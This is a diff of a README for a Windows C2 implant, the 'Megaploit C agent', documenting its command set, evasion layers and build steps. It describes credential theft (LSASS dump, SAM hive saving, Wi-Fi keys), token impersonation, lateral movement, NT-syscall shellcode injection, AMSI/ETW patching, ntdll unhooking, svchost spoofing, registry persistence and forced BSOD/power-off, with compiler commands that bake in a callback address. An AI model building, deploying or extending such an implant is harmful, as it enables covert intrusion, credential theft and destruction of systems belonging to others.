@@ -1,8 +1,8 @@
 # C-remote-shell — Megaploit C Agent
 
-> A hardened, minimal Windows/Linux implant that integrates fully with the Megaploit C2.  
-> All traffic is protected by four stacked security layers that exactly mirror the Megaploit listener protocol.  
-> Compiled to a **single EXE** with no runtime dependencies — just copy and run.
+A Windows-native C2 agent for the [Megaploit](https://github.com/hagba/Megaploit) framework.
+Fully encrypted, authenticated, and evasion-hardened — designed to pair with
+`python server.py -lh <IP> -p <PORT> --tls`.
 
 > **This is an active Work In Progress**. We recently decided to revive this codebase, it will take a while to get all the bugs ironed out and all units working properly.
 > Undocumented Windows API calls are involved in this project (RtlAdjustPrivilege, NtRaiseHardError, etc...) these are just for a Proof of Concept, these calls may be subject to change at any point with every new release of the Windows NT Kernel.
@@ -11,25 +11,16 @@
 
 ## Table of Contents
 
-- [Quick Start](#quick-start)
-- [Commands Reference](#commands-reference)
-  - [Shell Commands (all platforms)](#shell-commands-all-platforms)
-  - [File System](#file-system)
-  - [File Transfer](#file-transfer)
-  - [Process Intelligence](#process-intelligence)
-  - [Injection & Migration](#injection--migration)
-  - [Persistence](#persistence)
-  - [Destructive / Power](#destructive--power)
-- [Security Architecture](#security-architecture)
-- [Building the Agent](#building-the-agent)
-  - [Option A — From the C2 Console (recommended)](#option-a--from-the-c2-console-recommended)
-  - [Option B — Makefile](#option-b--makefile)
-  - [Option C — Direct Compiler Invocation](#option-c--direct-compiler-invocation)
-- [Build Flags (Size & Evasion)](#build-flags-size--evasion)
-- [Project Layout](#project-layout)
-- [Configuration Reference](#configuration-reference)
-- [Protocol Wire Format](#protocol-wire-format)
-- [What Changed from the Original](#what-changed-from-the-original)
+1. [Quick Start](#quick-start)
+2. [Commands Reference](#commands-reference)
+3. [Evasion & Stealth](#evasion--stealth)
+4. [Security Architecture](#security-architecture)
+5. [Building the Agent](#building-the-agent)
+6. [Project Layout](#project-layout)
+7. [Configuration Reference](#configuration-reference)
+8. [Protocol Wire Format](#protocol-wire-format)
+9. [What Changed](#what-changed)
+10. [Adding a New Command](#adding-a-new-command)
 
 ---
 
@@ -38,405 +29,279 @@
 ### 1. Generate a TLS certificate and start the Megaploit listener
 
 ```bash
-# Generate self-signed cert (one-time)
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-
-# Start the C2
-python3 server.py -lh 0.0.0.0 -p 4444 --cert cert.pem --key key.pem
+# from the Megaploit repo root
+python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
+python server.py -lh 192.168.1.226 -p 50005 --tls
 ```
 
-### 2. Build and deploy the agent from inside the C2 console
+### 2. Build the agent
 
+```powershell
+# MSYS2 UCRT64 on Windows (recommended)
+$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
+cd C-remote-shell
+mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
 ```
-megaploit> generate_c 10.0.0.1 4444
-```
 
-This runs a full compliance probe, patches `config.h` with your IP/port/key,
-compiles via MSVC or MinGW, and prints the resulting EXE path and SHA256.
+The output is `megaploit_c_agent.exe` (~60 KB stripped).
 
-```
-  C2 Compliance Probe Report
-  ...
-  Summary: 33/33 required signals found  (46/46 total)
-  Verdict: [+] COMPLIANT
-
-[+] C-agent built: megaploit_c_agent.exe
-    Size:   148,480 bytes
-    SHA256: a1b2c3d4...
-    Time:   4.2s
-
-    Deploy to target and run -- it will call back to 10.0.0.1:4444
-```
+The `secret.key` file must be present next to the EXE when it runs (or in
+the directory it was launched from — the agent resolves the absolute path at
+startup before any migration).
 
 ### 3. Catch the session
 
-```
-megaploit> sessions
-ID          Host             OS            User
-session-1   192.168.1.100    Windows 10    DESKTOP\john
-
-megaploit> interact session-1
-[session-1] > sysinfo
-[*] System Information
-    OS:           Windows 10.0 (Build 19045)
-    Hostname:     DESKTOP-ABC
-    Username:     john
-    Architecture: x64
-    CWD:          C:\Users\john
-```
+Run `megaploit_c_agent.exe` on the target. The agent connects back, completes
+the TLS + HMAC handshake, and a session appears in the Megaploit console.
 
 ---
 
 ## Commands Reference
 
-The agent speaks the exact same wire protocol as the Python/Go agents.
-Every standard Megaploit session command works via the `_popen()` shell
-fallback. The verbs listed below are handled **natively inside the C agent**
-for speed and reliability.
+### Native C handlers (direct Windows API — no child process)
+
+| Verb | Args | Description |
+|---|---|---|
+| `sysinfo` | — | OS version, hostname, username, arch, CWD |
+| `os_info` | — | Build number, install date, uptime |
+| `cd` | `<path>` | `SetCurrentDirectoryA` |
+| `ls` | `[path]` | Directory listing with size and date |
+| `ps` | — | Running processes: PID, PPID, name, arch, owner |
+| `kill` | `<pid>` | `TerminateProcess` |
+| `env` | `[filter]` | Dump environment variables (optional substring filter) |
+| `getclip` | — | Read clipboard text |
+| `setclip` | `<text>` | Write clipboard text |
+| `idle_time` | — | Seconds since last user input (`GetLastInputInfo`) |
+| `lock_screen` | — | `LockWorkStation` |
+| `active_windows` | — | Titles of all visible top-level windows |
+| `msgbox` | `<title> <message>` | Pop a dialog via `mshta.exe` (detached) |
+| `upload` | `<filename>` | Receive a file from C2 and write to disk |
+| `download` | `<path>` | Read a file from disk and send to C2 |
+| `persist` | `<regkey> <filename>` | Copy EXE to `%APPDATA%\<filename>`, set HKCU Run key |
+| `self_destruct` | — | Remove run key, schedule EXE deletion, exit |
+
+### Lateral movement & credential access
+
+| Verb | Args | Description |
+|---|---|---|
+| `dump_lsass` | — | `MiniDumpWriteDump` lsass → `%TEMP%\lsass.dmp`; pull with `download` |
+| `token_impersonate` | `<pid>` | Steal + impersonate the primary token from a process |
+| `lateral_wmi` | `<host> <cmd>` | Remote exec via `wmic Win32_Process.Create` |
+| `lateral_sc` | `<host> <cmd>` | Remote exec via `sc create/start/delete` (runs as SYSTEM) |
+
+### Injection & migration
+
+| Verb | Args | Description |
+|---|---|---|
+| `inject` | `<pid> <hex>` | Inject raw shellcode (hex string) into a process via NT syscalls |
+| `migrate` | `<pid>` | Reflective PE injection into `<pid>`, then `ExitProcess(0)` |
+
+### In-process evasion (live verbs)
+
+| Verb | Description |
+|---|---|
+| `etw_patch` | Patch `EtwEventWrite` → `ret` in the current process |
+
+### Power / destructive
+
+| Verb | Wire form | Description |
+|---|---|---|
+| `forceoff` | `forceOff()` | `NtSetSystemPowerState` + `NtShutdownSystem` |
+| `bluescreen` | `blueScreen()` | `NtRaiseHardError(STATUS_ASSERTION_FAILURE)` — kernel BSOD |
+
+### Shell-command fallbacks (`cmd.exe`)
+
+These verbs are recognised by name and translated into the corresponding
+Windows shell command — no native API call:
+
+| Verb | Shell command run |
+|---|---|
+| `users` | `net user` |
+| `logged_in` | `query user` |
+| `services [filter]` | `sc query state= all [| findstr <filter>]` |
+| `scheduled_tasks` | `schtasks /query /fo LIST` |
+| `installed_software` | `wmic product get Name,Version,InstallDate` |
+| `startup_items` | `reg query HKCU\...\Run` + `HKLM\...\Run` |
+| `wifi_passwords` | `netsh wlan show profile name=... key=clear` |
+| `hashdump` | `reg save HKLM\SAM/SYSTEM → %TEMP%` |
+| `netstat` | `netstat -ano` |
+| `arp` | `arp -a` |
+| `ifconfig` | `ipconfig /all` |
+| `routes` | `route print` |
+| `dns_query <host>` | `nslookup <host>` |
+| `sandbox_check` | CPU cores + disk size + uptime + debugger check |
+| `cat <file>` | `type "<file>"` |
+| `mkdir <path>` | `mkdir "<path>"` |
+| `rm <path>` | `del /f /q` or `rmdir /s /q` depending on target type |
+| `find_files <path> [pat]` | `dir /s /b "<path>\<pat>"` |
+| `file_hash <path>` | `certutil -hashfile "<path>" SHA256` |
+| `tail <file> [n]` | `Get-Content '<file>' -Tail <n>` (PowerShell) |
+| `write_file <path> <content>` | `Set-Content` (PowerShell) |
+| `chmod <mode> <path>` | `icacls` (Windows approximation) |
+| `find_writable <path>` | `icacls /t | findstr "(W) (M) (F)"` |
+| `find_suid` | Lists unquoted service paths (no SUID on Windows) |
+| `<anything else>` | Passed verbatim to `_popen("cmd /c ...")` |
+
+### Not-supported stubs
+
+The following Python-agent-only verbs return a clear error instead of hanging:
+`screenshot`, `screenrecord`, `screen_stream`, `webcam`, `record`, `mic_level`,
+`keylog_*`, `browser_*`, `inject_shellcode`, `dll_inject`, `reverse_shell`,
+`socks5`, `portfwd`, `uac_bypass`, `cred_vault`, `ssh_harvest`, `sudo_*`,
+`clip_watch`, `notify`, `open_url`, `play_sound`, `set_wallpaper`, `mouse_move`,
+`type_keys`, `forkbomb`, `living_off_land`, `zip_download`, `zip_upload`,
+`run_psh`, `run_python`, `pty_shell`, `load_extension`, `unload_extension`,
+`irb`, `getsystem`, `kiwi`.
 
 ---
 
-### Shell Commands (all platforms)
+## Evasion & Stealth
 
-Any command not explicitly handled is passed to `cmd.exe /C` and the output
-is returned. This covers hundreds of built-in Windows tools automatically.
+The agent applies multiple independent layers at startup, before the C2
+connection is attempted.
 
-```
-[session-1] > whoami
-DESKTOP-ABC\john
+### 1. Process-identity spoofing (`client/spoof.c`)
 
-[session-1] > ipconfig /all
-Windows IP Configuration ...
+| Technique | API | Effect |
+|---|---|---|
+| PEB field overwrite | `RTL_USER_PROCESS_PARAMETERS` | Task Manager command-line column, ProcExp Properties > Image show `svchost.exe -k netsvcs -p -s Schedule` |
+| Kernel image name | `NtSetInformationProcess(class 49)` | Process Hacker "Image" column shows `svchost.exe` |
+| LDR unlink | stub (disabled) | Placeholder; LDR arithmetic proved version-sensitive on Windows 11 builds |
 
-[session-1] > net user
-User accounts for \\DESKTOP-ABC ...
+### 2. EDR evasion (`client/evasion.c`)
 
-[session-1] > net localgroup administrators
-Alias name     administrators
-Members        Administrator, john
+| Function | What it does |
+|---|---|
+| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions get clean stubs. |
+| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub. Stops Windows Event Tracing telemetry from this process reaching any consumer (Defender, EDR, WEF). |
+| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN`. Prevents PowerShell / WSH / .NET AMSI content scanning in-process. |
 
-[session-1] > dir C:\Users\john\Desktop
- Volume in drive C is Windows
- Directory of C:\Users\john\Desktop
-...
-```
+### 3. Auto-migration (`client/inject.c` — `auto_migrate`)
 
----
+On startup (before the C2 connect loop), the agent:
 
-### File System
+1. Copies itself to `%TEMP%\RuntimeBroker.exe`
+2. Spawns it as a new process (`CREATE_SUSPENDED`)
+3. Resumes the suspended process
+4. The original process calls `ExitProcess(0)` and vanishes from Task Manager
 
-#### `sysinfo` — full system info
+The running copy is then `RuntimeBroker.exe` in `%TEMP%`, which is harder to
+associate with the drop path.
 
-```
-[session-1] > sysinfo
-[*] System Information
-    OS:           Windows 10.0 (Build 19045)
-    Hostname:     DESKTOP-ABC
-    Username:     john
-    Architecture: x64
-    CWD:          C:\Users\john
-```
+### 4. Shellcode injection evasion (`client/inject.c`)
 
-#### `cd <path>` — change working directory
+- Uses `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`,
+  `NtCreateThreadEx` directly — avoids the high-signal `VirtualAllocEx` /
+  `CreateRemoteThread` Win32 wrappers that EDR products hook.
+- Two-phase memory permissions: **RW** (write shellcode) → **RX** (execute). No
+  RWX pages ever exist.
+- `NtCreateThreadEx` called with `HideFromDebugger` flag.
 
-```
-[session-1] > cd C:\Windows\Temp
-[+] cwd: C:\Windows\Temp
+### 5. Obfuscated sleep (`obfuscate_sleep`)
 
-[session-1] > cd ..
-[+] cwd: C:\Windows
-```
-
-#### `ls [path]` — directory listing
-
-Lists files and directories with sizes and timestamps. Defaults to current
-working directory if no path is given.
-
-```
-[session-1] > ls
-Directory of C:\Users\john\Desktop
-
-  [DIR]  Documents                                   2024-01-10 09:15
-  [DIR]  Downloads                                   2024-01-14 17:32
-  [   ]  passwords.txt                        1234 bytes  2024-01-15 14:22
-  [   ]  notes.docx                          45600 bytes  2024-01-12 11:08
-
-[session-1] > ls C:\Windows\System32
-Directory of C:\Windows\System32
-
-  [DIR]  drivers                                     2023-06-15 04:00
-  [   ]  cmd.exe                             289792 bytes  2023-06-14 17:45
-  ...
-```
-
----
-
-### File Transfer
-
-#### `download <remote-path>` — pull a file from the target
-
-```
-[session-1] > download C:\Users\john\passwords.txt
-[+] Downloaded: passwords.txt (1.2 KB)
-
-[session-1] > download C:\Windows\Temp\sam.bak
-[+] Downloaded: sam.bak (262144 bytes)
-```
-
-#### `upload <filename>` — push a file to the target
-
-The server sends the file name first; the next framed message contains the
-raw bytes. Megaploit handles this transparently from the operator side.
-
-```
-[session-1] > upload /root/tools/mimikatz.exe
-# server prompts for local path if needed
-[+] Received: mimikatz.exe (1245184 bytes)
-```
-
----
-
-### Process Intelligence
-
-#### `ps` — list all running processes
-
-Shows PID, PPID, process name, architecture (x86/x64 via `IsWow64Process`),
-and the token owner (domain\\username via `LookupAccountSid`).
-
-```
-[session-1] > ps
-  PID      PPID     Name                                     Arch   User
-  ---      ----     ----                                     ----   ----
-  4        0        System                                   x64    NT AUTHORITY\SYSTEM
-  440      4        smss.exe                                 x64    NT AUTHORITY\SYSTEM
-  644      636      winlogon.exe                             x64    NT AUTHORITY\SYSTEM
-  880      860      explorer.exe                             x64    DESKTOP-ABC\john
-  1234     880      chrome.exe                               x64    DESKTOP-ABC\john
-  3456     880      notepad.exe                              x64    DESKTOP-ABC\john
-  5120     880      cmd.exe                                  x86    DESKTOP-ABC\john
-```
-
----
-
-### Injection & Migration
-
-These commands use the **NT native API directly** — `NtAllocateVirtualMemory`,
-`NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` — to avoid
-the most-hooked Win32 layer (`VirtualAllocEx` / `CreateRemoteThread`).
-
-#### `inject <pid> <hex-shellcode>` — inject shellcode into a process
-
-```
-# Step 1: find a good host process with ps
-[session-1] > ps
-  PID      ...  Name            Arch   User
-  880      ...  explorer.exe    x64    DESKTOP-ABC\john
-
-# Step 2: generate shellcode with msfvenom (example: calc.exe)
-# msfvenom -p windows/x64/exec CMD=calc.exe -f hex
-# → fc4883e4f0e8c800...
-
-# Step 3: inject
-[session-1] > inject 880 fc4883e4f0e8c800000000...
-[+] inject: 279 bytes shellcode injected and executing in PID 880
-```
-
-**Evasion notes:**
-- Memory is allocated as **RW**, written, then flipped to **RX** before the thread starts. No page is ever RWX.
-- Thread created with `THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`.
-- No `VirtualAllocEx` / `CreateRemoteThread` in the IAT.
-
-#### `migrate <pid>` — move the agent into another process
-
-Injects a position-independent bootstrap that calls `LoadLibraryA` on the
-agent's EXE path inside the target process. The Windows loader handles all
-relocation and IAT resolution. The current agent process exits cleanly after
-the new instance starts.
-
-```
-# Move into explorer.exe to blend in
-[session-1] > migrate 880
-[+] migrate: agent spawned in PID 880 — terminating current process
-
-# A new session appears automatically
-[+] New session opened: session-2
-    Host: 192.168.1.100
-    OS:   Windows 10 Pro (x64)
-    User: DESKTOP-ABC\john (running inside explorer.exe)
-```
-
-**Use cases:**
-- Move from a short-lived process (e.g. `cmd.exe`) into a long-lived one (e.g. `explorer.exe`, `svchost.exe`)
-- Inherit a higher-integrity token by migrating into a SYSTEM-level process (requires SeDebugPrivilege)
-- Make the agent harder to find by hiding inside legitimate traffic
-
----
-
-### Persistence
-
-#### `persist <regkey-name> <filename>` — install a HKCU Run key
-
-Copies the current EXE to `%APPDATA%\<filename>` and writes a registry
-Run key so it starts at user logon.
-
-```
-[session-1] > persist WindowsUpdater updater.exe
-[+] Persistence installed
-
-# What was done:
-# CopyFile(current.exe) → C:\Users\john\AppData\Roaming\updater.exe
-# reg add HKCU\...\Run /v WindowsUpdater /d "C:\...\updater.exe" /f
-```
-
-Remove persistence:
-```
-[session-1] > self_destruct
-[+] Registry run key removed
-[*] Self-destruct complete — terminating.
-```
-
----
-
-### Destructive / Power
-
-These are **C-exclusive verbs** auto-detected by `megaploit/core/c_probe.py`.
-The operator commands are registered automatically at server startup.
-
-#### `forceoff` → wire: `forceOff()` — immediate hardware power-off
-
-Calls `NtSetSystemPowerState(PowerActionShutdownOff, ...)` followed by
-`NtShutdownSystem(ShutdownPowerOff)`. Bypasses shutdown callbacks and
-forcibly cuts power. Requires `SeShutdownPrivilege` (acquired at startup).
-
-```
-[session-1] > forceoff
-# target machine powers off immediately — no warning dialog
-```
-
-#### `bluescreen` → wire: `blueScreen()` — force a kernel BSOD
-
-Calls `NtRaiseHardError(STATUS_ASSERTION_FAILURE, ..., ResponseOption=6)`.
-Response option 6 (`OptionShutdownSystem`) triggers an immediate BSOD.
-
-```
-[session-1] > bluescreen
-# target blue-screens immediately — STOP: CRITICAL_PROCESS_DIED
-```
+During reconnect delays the agent XOR-scrambles all private RX pages so memory
+scanners see only ciphertext. Falls back to plain `Sleep()` on `BCryptGenRandom`
+failure.
 
 ---
 
 ## Security Architecture
 
-All four layers are established in `tls_connect()` before any shell traffic.
+Four layers wrap every byte in transit:
 
-| # | Layer | Implementation | Mirrors |
-|---|-------|----------------|---------|
-| 1 | **TLS 1.2 / 1.3** | SChannel — `SP_PROT_TLS1_2_CLIENT \| SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO` (AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION` | `listener.py build_agent_ssl_context()` |
-| 2 | **HMAC-SHA256** | BCrypt — server sends 16-byte random challenge, client replies with `HMAC-SHA256(key, challenge)` = 32 bytes | `crypto.py agent_authenticate()` |
-| 3 | **Protocol v2** | Server sends `0x4d` (`'M'`); client echoes back to confirm v2 | `protocol.py handshake_agent()` |
-| 4 | **AES-256-GCM** | BCrypt — `[uint32-BE len][nonce(12)][ciphertext+tag(16)]`, uint64-BE seq counter (replay protection). Key handles are **cached** — open once per session, reused for every message (~10× faster than open-per-message). | `protocol.py send_msg() / recv_msg()` |
+```
+TLS 1.2/1.3 (SChannel, AEAD-only)
+  └─ HMAC-SHA256 challenge/response  (secret.key, 32 raw bytes)
+       └─ Protocol v2 magic-byte echo  (0x4d)
+            └─ AES-256-GCM framed messages
+                 [uint32-BE length][nonce(12)][ciphertext][GCM-tag(16)]
+                 + uint64-BE sequence counter (replay protection)
+```
 
-The compliance prober (`megaploit/core/c_probe.py`) verifies **33 required
-signals** across all four layers before `generate_c` will compile the client.
+**Layer 1 — TLS**  
+`SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO`
+(AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION`. Certificate
+verification disabled (C2 uses a self-signed cert).
+
+**Layer 2 — HMAC authentication**  
+Server sends a 16-byte random challenge. Agent replies with
+`HMAC-SHA256(secret_key[32], challenge[16])`. Server drops the connection on
+mismatch.
+
+**Layer 3 — Protocol handshake**  
+Server sends `0x4d` (`M`). Agent echoes it back. Ensures both ends are
+running a compatible Megaploit build.
+
+**Layer 4 — AES-256-GCM framing**  
+Every application message is independently encrypted with a fresh 12-byte
+nonce. A big-endian 64-bit sequence number is prepended to the plaintext
+before encryption; the receiver enforces strict monotonicity (replay protection).
+Cached BCrypt key handles (`hAesKeyEnc` / `hAesKeyDec` in `TLS_CONTEXT`) avoid
+re-importing the key on every message.
 
 ---
 
 ## Building the Agent
 
-### Option A — From the C2 Console (recommended)
+### Requirements
 
+- **Windows host** with MSYS2 UCRT64 (`C:\msys64\ucrt64\bin` in PATH), **or**
+- **Linux / macOS** with `x86_64-w64-mingw32-gcc` (`apt install mingw-w64`)
+
+Link libraries: `Secur32`, `Crypt32`, `ws2_32`, `bcrypt`, `Advapi32`, `User32`
+
+### Option A — MinGW (MSYS2 UCRT64 on Windows, recommended)
+
+```powershell
+$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
+cd C-remote-shell
+mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
 ```
-megaploit> generate_c <LHOST> <LPORT>
-```
 
-The C2 will:
-1. Run 46-signal compliance probe (aborts if any required signal is missing)
-2. Auto-discover all `.c` source files and `config.h`
-3. Patch `config.h` with the supplied IP, port, and hex-encoded session key
-4. Compile via MSVC (`cl.exe`) or MinGW (`x86_64-w64-mingw32-gcc`)
-
-### Option B — Makefile
+### Option B — MinGW cross-compile (Linux / macOS)
 
 ```bash
-# Auto-detect compiler, build with defaults
-make
-
-# Override C2 address
-make C2_IP=10.0.0.1 C2_PORT=4444
-
-# Force MinGW (Linux/macOS cross-compile)
-make CC=x86_64-w64-mingw32-gcc C2_IP=10.0.0.1 C2_PORT=4444
-
-# Force MSVC (from Developer Command Prompt)
-make CC=cl C2_IP=10.0.0.1 C2_PORT=4444
-
-# Size-optimised release (default — already applied)
-make                          # uses -Os -s (MinGW) or /O1 /GS- (MSVC)
+cd C-remote-shell
+make CC=x86_64-w64-mingw32-gcc C2_IP=192.168.1.226 C2_PORT=50005
 ```
 
-### Option C — Direct Compiler Invocation
+### Option C — MSVC (Developer Command Prompt)
 
-**MSVC (from a Developer Command Prompt)**
-
-```bat
-cl /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG ^
-   /DC2_IP="10.0.0.1" /DC2_PORT=4444 ^
-   client\main.c client\ntcalls.c client\shell.c client\inject.c tls\tls_client.c ^
-   /link /OPT:REF /OPT:ICF /LTCG ^
-   Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib ^
-   /out:megaploit_c_agent.exe
+```cmd
+cd C-remote-shell
+nmake C2_IP=192.168.1.226 C2_PORT=50005
 ```
 
-**MinGW (cross-compile on Linux/macOS)**
+### Option D — Direct compiler invocation
 
 ```bash
-x86_64-w64-mingw32-gcc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
-    -ffunction-sections -fdata-sections -fno-ident -fno-asynchronous-unwind-tables \
-    -DC2_IP=\"10.0.0.1\" -DC2_PORT=4444 \
-    client/main.c client/ntcalls.c client/shell.c client/inject.c tls/tls_client.c \
-    -o megaploit_c_agent.exe \
-    -Wl,--gc-sections -Wl,--strip-all \
-    -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
+cc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32         \
+   -ffunction-sections -fdata-sections                            \
+   -fno-ident -fno-asynchronous-unwind-tables                     \
+   -DC2_IP=\"192.168.1.226\" -DC2_PORT=50005                      \
+   client/main.c client/spoof.c client/ntcalls.c client/shell.c  \
+   client/handlers_system.c client/handlers_ui.c                  \
+   client/handlers_lateral.c client/inject.c client/evasion.c    \
+   tls/tls_client.c                                               \
+   -o megaploit_c_agent.exe                                       \
+   -Wl,--gc-sections -Wl,--strip-all                              \
+   -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32     \
+   -mwindows
 ```
 
-**Standalone POSIX server (for manual testing — no C2 needed)**
+### Build flags
 
-```bash
-gcc -O2 -Wall -DLISTEN_PORT=4444 \
-    server/main.c server/server.c server/prompt.c \
-    -o serverShell
-./serverShell
-```
-
----
-
-## Build Flags (Size & Evasion)
-
-The Makefile already applies these by default. Documented here for reference.
-
-### MinGW
-
-| Flag | Effect |
-|------|--------|
-| `-Os` | Optimise for binary size (vs `-O2` which optimises for speed) |
-| `-s` | Strip all symbols from the binary |
-| `-ffunction-sections -fdata-sections` | Put each function/data in its own section |
-| `-Wl,--gc-sections` | Linker dead-strips unreferenced sections |
-| `-Wl,--strip-all` | Linker strips remaining symbol info |
-| `-fno-ident` | Omit the GCC version string from the binary |
-| `-fno-asynchronous-unwind-tables` | Strip `.eh_frame` / `.pdata` (~10–15% smaller) |
-| `-mwindows` | GUI subsystem — OS never allocates a console window |
-
-### MSVC
-
-| Flag | Effect |
-|------|--------|
-| `/O1` | Optimise for size |
-| `/GS-` | Disable stack buffer security cookies (saves ~1 KB of overhead) |
-| `/Gy` | Function-level linking |
-| `/GL` | Whole-program optimisation |
-| `/OPT:REF /OPT:ICF` | Dead-code elimination and identical COMDAT folding at link time |
-| `/LTCG` | Link-time code generation (works with `/GL`) |
+| Flag | Purpose |
+|---|---|
+| `-Os` | Optimise for size |
+| `-s` | Strip all symbols |
+| `-ffunction-sections -fdata-sections` + `--gc-sections` | Dead-code removal at link time |
+| `-fno-ident` | Omit GCC version string from binary |
+| `-fno-asynchronous-unwind-tables` | Strip `.eh_frame` / `.pdata` (~10–15% size saving) |
+| `-mwindows` | GUI subsystem — no console window spawned |
+| `-DNDEBUG` | Strip asserts and debug strings |
+| `-DUNICODE -D_UNICODE` | Wide-character Windows API |
+| `-DSECURITY_WIN32` | Required by `<security.h>` / SChannel |
 
 ---
 
@@ -445,149 +310,217 @@ The Makefile already applies these by default. Documented here for reference.
 ```
 C-remote-shell/
 │
-├── client/               # Windows implant (runs on target)
-│   ├── config.h          # C2_IP, C2_PORT, SECRET_KEY_PATH, buffer sizes
-│   ├── ntcalls.h/c       # NT native API: RtlAdjustPrivilege, NtShutdownSystem,
-│   │                     #   NtRaiseHardError, NtSetSystemPowerState
-│   ├── inject.h/c        # inject_shellcode(), migrate_to_pid()
-│   │                     #   NtAllocateVirtualMemory, NtWriteVirtualMemory,
-│   │                     #   NtProtectVirtualMemory, NtCreateThreadEx
-│   ├── shell.h/c         # Verb dispatch table + _popen fallback
-│   │                     #   strncmp() calls here are the source of truth
-│   │                     #   for c_probe verb extraction
-│   └── main.c            # WinMain: mutex, Winsock, key loader, reconnect loop
+├── Makefile                      Auto-detect MSVC/MinGW; targets: client, legacy, server, clean
 │
-├── tls/                  # Encrypted transport (Windows-native, no OpenSSL)
-│   ├── tls_client.h      # TLS_CONTEXT struct + cached BCrypt key handles
-│   └── tls_client.c      # SChannel TLS 1.2/1.3 + BCrypt AES-256-GCM + HMAC-SHA256
+├── client/
+│   ├── config.h                  C2 IP/port, key path, buffer sizes (all tuneable constants)
+│   ├── main.c                    WinMain: spoof → evasion → auto_migrate → connect loop
+│   │
+│   ├── spoof.h / spoof.c         Process-identity spoofing (PEB + kernel image name)
+│   ├── evasion.h / evasion.c     EDR evasion: unhook_ntdll, etw_patch, amsi_patch
+│   ├── ntcalls.h / ntcalls.c     NT native syscall pointer resolution and verification
+│   ├── inject.h / inject.c       Shellcode injection, reflective PE migrate, auto_migrate,
+│   │                               obfuscated sleep
+│   │
+│   ├── peb_walk.h / peb_walk.c   PEB-based module enumeration (GetProcAddress replacement)
+│   ├── syscall.h / syscall.c     Direct syscall stubs (avoids Win32 wrappers)
+│   │
+│   ├── shell.h                   Public API: shell_run(TLS_CONTEXT *)
+│   ├── shell.c                   Dispatch loop + _json_unwrap + _send_str + _shell_exec
+│   ├── shell_internal.h          Shared internal API (handler forward declarations)
+│   ├── handlers_system.c         sysinfo, os_info, cd, ls, ps, kill, env,
+│   │                               idle_time, lock_screen, active_windows
+│   ├── handlers_ui.c             getclip, setclip, msgbox, upload, download,
+│   │                               persist, self_destruct
+│   ├── handlers_lateral.c        dump_lsass, token_impersonate, lateral_wmi, lateral_sc
+│   │
+│   ├── loader.h / loader.c       Reflective PE loader stub (position-independent, < 512 B)
+│   ├── loader_blob.h             Auto-generated: loader stub as a C byte array
+│   └── gen_loader_blob.ps1       PowerShell script that generates loader_blob.h from loader.bin
 │
-├── server/               # Standalone operator console (no C2 required)
-│   ├── config.h          # LISTEN_PORT, LISTEN_ADDR
-│   ├── server.h/c        # TCP socket, bind, listen, accept
-│   ├── prompt.h/c        # stdin → send → recv → print loop
-│   └── main.c            # entry point
+├── tls/
+│   ├── tls_client.h              TLS_CONTEXT struct, public API declarations
+│   └── tls_client.c              Full TLS + HMAC + AES-GCM implementation (SChannel)
 │
-├── Makefile              # MSVC + MinGW targets; C2_IP/C2_PORT/size flags
-├── definitions.h         # Legacy compatibility shim (Source.c)
-├── Source.c              # Legacy single-file build (kept for reference)
-├── serverShell.c         # Legacy single-file server (kept for reference)
-├── CHANGELOG.md          # Full bug-fix log and developer guide
-└── README.md             # This file
+├── server/                       Refactored POSIX C2 listener (Linux / macOS)
+│   ├── config.h
+│   ├── main.c
+│   ├── server.h / server.c
+│   └── prompt.h / prompt.c
+│
+├── Source.c                      Legacy monolithic client (kept for `make legacy`)
+├── definitions.h                 Shared globals for Source.c
+├── serverShell.c                 Legacy POSIX server (kept for `make server-posix-legacy`)
+│
+└── megaploit_c_agent.exe         Current production build artifact
 ```
 
 ---
 
 ## Configuration Reference
 
-| File | Symbol | Default | Purpose |
-|------|--------|---------|---------|
-| `client/config.h` | `C2_IP` | `192.168.1.226` | C2 server IP. Overridden by `generate_c` at build time. |
-| `client/config.h` | `C2_PORT` | `50005` | TCP port. Overridden by `generate_c`. |
-| `client/config.h` | `SECRET_KEY_PATH` | `"secret.key"` | Key file path (unused when built via `generate_c`; key is baked in). |
-| `client/config.h` | `RECONNECT_DELAY_SEC` | `10` | Seconds between reconnect attempts. |
-| `client/config.h` | `SHELL_LINE_BUF` | `4096` | Single `fgets()` line buffer from `_popen()`. |
-| `client/config.h` | `SHELL_RESP_BUF` | `65536` | Accumulated `_popen()` output (64 KB). |
-| `client/config.h` | `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode size for `inject` (32 KB). |
-| `client/config.h` | `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps`. |
-| `server/config.h` | `LISTEN_PORT` | `50005` | Standalone server listen port. |
+All compile-time knobs live in [`client/config.h`](client/config.h).
+
+| Constant | Default | Description |
+|---|---|---|
+| `C2_IP` | `"192.168.1.226"` | C2 listener address — override via `-DC2_IP=...` |
+| `C2_PORT` | `50005` | C2 listener port — override via `-DC2_PORT=...` |
+| `RECONNECT_DELAY_SEC` | `10` | Seconds between failed connection retries |
